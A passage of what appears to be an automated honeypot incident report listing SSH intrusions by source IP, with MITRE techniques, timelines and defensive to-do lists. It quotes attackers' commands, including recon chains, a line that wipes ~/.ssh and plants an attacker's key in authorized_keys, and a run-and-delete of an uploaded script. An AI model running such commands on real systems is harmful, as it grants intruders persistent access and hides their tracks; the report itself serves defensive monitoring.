| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:16:24` | `cowrie.session.connect` |
| `2026-08-16 01:16:25` | `cowrie.client.version` |
| `2026-08-16 01:16:25` | `cowrie.client.kex` |
| `2026-08-16 01:16:28` | `cowrie.login.success` |
| `2026-08-16 01:16:30` | `cowrie.session.params` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.success` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:30` | `cowrie.command.input` |
| `2026-08-16 01:16:31` | `cowrie.log.closed` |
| `2026-08-16 01:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f67d841b5f1a

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 01:17 |
| **Last Seen** | 2026-08-16 01:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:17:22` | `cowrie.session.connect` |
| `2026-08-16 01:17:22` | `cowrie.client.version` |
| `2026-08-16 01:17:22` | `cowrie.client.kex` |
| `2026-08-16 01:17:22` | `cowrie.login.success` |
| `2026-08-16 01:17:23` | `cowrie.session.params` |
| `2026-08-16 01:17:23` | `cowrie.command.input` |
| `2026-08-16 01:17:24` | `cowrie.log.closed` |
| `2026-08-16 01:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c1a011ddf5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:17 |
| **Last Seen** | 2026-08-16 01:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:17:28` | `cowrie.session.connect` |
| `2026-08-16 01:17:29` | `cowrie.client.version` |
| `2026-08-16 01:17:29` | `cowrie.client.kex` |
| `2026-08-16 01:17:34` | `cowrie.login.success` |
| `2026-08-16 01:17:36` | `cowrie.session.params` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.success` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:36` | `cowrie.command.input` |
| `2026-08-16 01:17:38` | `cowrie.log.closed` |
| `2026-08-16 01:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38332e6aeb8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:18 |
| **Last Seen** | 2026-08-16 01:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:18:35` | `cowrie.session.connect` |
| `2026-08-16 01:18:37` | `cowrie.client.version` |
| `2026-08-16 01:18:37` | `cowrie.client.kex` |
| `2026-08-16 01:18:41` | `cowrie.login.success` |
| `2026-08-16 01:18:43` | `cowrie.session.params` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.success` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:43` | `cowrie.command.input` |
| `2026-08-16 01:18:45` | `cowrie.log.closed` |
| `2026-08-16 01:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2da2e82c3352

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:19 |
| **Last Seen** | 2026-08-16 01:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:19:41` | `cowrie.session.connect` |
| `2026-08-16 01:19:41` | `cowrie.client.version` |
| `2026-08-16 01:19:42` | `cowrie.client.kex` |
| `2026-08-16 01:19:46` | `cowrie.login.success` |
| `2026-08-16 01:19:48` | `cowrie.session.params` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.success` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:48` | `cowrie.command.input` |
| `2026-08-16 01:19:50` | `cowrie.log.closed` |
| `2026-08-16 01:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d15516ac6c25

| Field | Detail |
|---|---|
| **Source IP** | `157.245.34[.]56` |
| **First Seen** | 2026-08-16 01:20 |
| **Last Seen** | 2026-08-16 01:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:20:11` | `cowrie.session.connect` |
| `2026-08-16 01:20:11` | `cowrie.client.version` |
| `2026-08-16 01:20:11` | `cowrie.client.kex` |
| `2026-08-16 01:20:12` | `cowrie.login.success` |
| `2026-08-16 01:20:13` | `cowrie.session.params` |
| `2026-08-16 01:20:13` | `cowrie.command.input` |
| `2026-08-16 01:20:13` | `cowrie.command.failed` |
| `2026-08-16 01:20:13` | `cowrie.log.closed` |
| `2026-08-16 01:20:13` | `cowrie.session.params` |
| `2026-08-16 01:20:13` | `cowrie.command.input` |
| `2026-08-16 01:20:13` | `cowrie.session.file_download` |
| `2026-08-16 01:20:13` | `cowrie.log.closed` |
| `2026-08-16 01:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.34[.]56` to AbuseIPDB if not already reported
- [ ] Block `157.245.34[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6597d1993ce6

| Field | Detail |
|---|---|
| **Source IP** | `157.245.34[.]56` |
| **First Seen** | 2026-08-16 01:20 |
| **Last Seen** | 2026-08-16 01:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:20:13` | `cowrie.session.connect` |
| `2026-08-16 01:20:13` | `cowrie.client.version` |
| `2026-08-16 01:20:14` | `cowrie.client.kex` |
| `2026-08-16 01:20:14` | `cowrie.login.success` |
| `2026-08-16 01:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.34[.]56` to AbuseIPDB if not already reported
- [ ] Block `157.245.34[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62782b607529

| Field | Detail |
|---|---|
| **Source IP** | `157.245.34[.]56` |
| **First Seen** | 2026-08-16 01:20 |
| **Last Seen** | 2026-08-16 01:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:20:14` | `cowrie.session.connect` |
| `2026-08-16 01:20:14` | `cowrie.client.version` |
| `2026-08-16 01:20:14` | `cowrie.client.kex` |
| `2026-08-16 01:20:14` | `cowrie.login.success` |
| `2026-08-16 01:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.34[.]56` to AbuseIPDB if not already reported
- [ ] Block `157.245.34[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1b4c33897a

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 01:20 |
| **Last Seen** | 2026-08-16 01:21 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:20:14` | `cowrie.session.connect` |
| `2026-08-16 01:20:20` | `cowrie.client.version` |
| `2026-08-16 01:20:20` | `cowrie.client.kex` |
| `2026-08-16 01:20:44` | `cowrie.login.success` |
| `2026-08-16 01:20:57` | `cowrie.session.params` |
| `2026-08-16 01:20:57` | `cowrie.command.input` |
| `2026-08-16 01:21:02` | `cowrie.log.closed` |
| `2026-08-16 01:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c37f257ff09

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:20 |
| **Last Seen** | 2026-08-16 01:21 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:20:45` | `cowrie.session.connect` |
| `2026-08-16 01:20:47` | `cowrie.client.version` |
| `2026-08-16 01:20:47` | `cowrie.client.kex` |
| `2026-08-16 01:20:52` | `cowrie.login.success` |
| `2026-08-16 01:20:54` | `cowrie.session.params` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.success` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:54` | `cowrie.command.input` |
| `2026-08-16 01:20:59` | `cowrie.log.closed` |
| `2026-08-16 01:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aecbdfed491f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:21 |
| **Last Seen** | 2026-08-16 01:22 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:21:50` | `cowrie.session.connect` |
| `2026-08-16 01:21:50` | `cowrie.client.version` |
| `2026-08-16 01:21:50` | `cowrie.client.kex` |
| `2026-08-16 01:22:01` | `cowrie.login.success` |
| `2026-08-16 01:22:03` | `cowrie.session.params` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.success` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:03` | `cowrie.command.input` |
| `2026-08-16 01:22:04` | `cowrie.log.closed` |
| `2026-08-16 01:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccfdfa85c94

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:22 |
| **Last Seen** | 2026-08-16 01:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:22:56` | `cowrie.session.connect` |
| `2026-08-16 01:22:57` | `cowrie.client.version` |
| `2026-08-16 01:22:57` | `cowrie.client.kex` |
| `2026-08-16 01:23:00` | `cowrie.login.success` |
| `2026-08-16 01:23:03` | `cowrie.session.params` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.success` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:03` | `cowrie.command.input` |
| `2026-08-16 01:23:05` | `cowrie.log.closed` |
| `2026-08-16 01:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a62e3167b3

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-16 01:23 |
| **Last Seen** | 2026-08-16 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:23:37` | `cowrie.session.connect` |
| `2026-08-16 01:23:37` | `cowrie.client.version` |
| `2026-08-16 01:23:37` | `cowrie.client.kex` |
| `2026-08-16 01:23:38` | `cowrie.login.success` |
| `2026-08-16 01:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54294032d8e4

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-16 01:23 |
| **Last Seen** | 2026-08-16 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:23:37` | `cowrie.session.connect` |
| `2026-08-16 01:23:37` | `cowrie.client.version` |
| `2026-08-16 01:23:38` | `cowrie.client.kex` |
| `2026-08-16 01:23:38` | `cowrie.login.success` |
| `2026-08-16 01:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18b146972ba1

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-16 01:23 |
| **Last Seen** | 2026-08-16 01:25 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:23:43` | `cowrie.session.connect` |
| `2026-08-16 01:23:43` | `cowrie.client.version` |
| `2026-08-16 01:23:43` | `cowrie.client.kex` |
| `2026-08-16 01:23:44` | `cowrie.login.success` |
| `2026-08-16 01:23:46` | `cowrie.session.file_upload` |
| `2026-08-16 01:23:47` | `cowrie.session.params` |
| `2026-08-16 01:23:47` | `cowrie.command.input` |
| `2026-08-16 01:23:47` | `cowrie.command.input` |
| `2026-08-16 01:23:47` | `cowrie.command.input` |
| `2026-08-16 01:23:47` | `cowrie.command.failed` |
| `2026-08-16 01:23:47` | `cowrie.log.closed` |
| `2026-08-16 01:23:48` | `cowrie.session.params` |
| `2026-08-16 01:23:48` | `cowrie.command.input` |
| `2026-08-16 01:23:48` | `cowrie.log.closed` |
| `2026-08-16 01:23:49` | `cowrie.session.params` |
| `2026-08-16 01:23:49` | `cowrie.command.input` |
| `2026-08-16 01:23:50` | `cowrie.log.closed` |
| `2026-08-16 01:23:51` | `cowrie.session.params` |
| `2026-08-16 01:23:51` | `cowrie.command.input` |
| `2026-08-16 01:23:51` | `cowrie.command.failed` |
| `2026-08-16 01:23:51` | `cowrie.command.failed` |
| `2026-08-16 01:24:52` | `cowrie.session.params` |
| `2026-08-16 01:24:52` | `cowrie.command.input` |
| `2026-08-16 01:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d143f89f348

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-08-16 01:23 |
| **Last Seen** | 2026-08-16 01:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:23:58` | `cowrie.session.connect` |
| `2026-08-16 01:23:59` | `cowrie.client.version` |
| `2026-08-16 01:23:59` | `cowrie.client.kex` |
| `2026-08-16 01:24:02` | `cowrie.login.success` |
| `2026-08-16 01:24:03` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a18f8d9659

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:24 |
| **Last Seen** | 2026-08-16 01:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
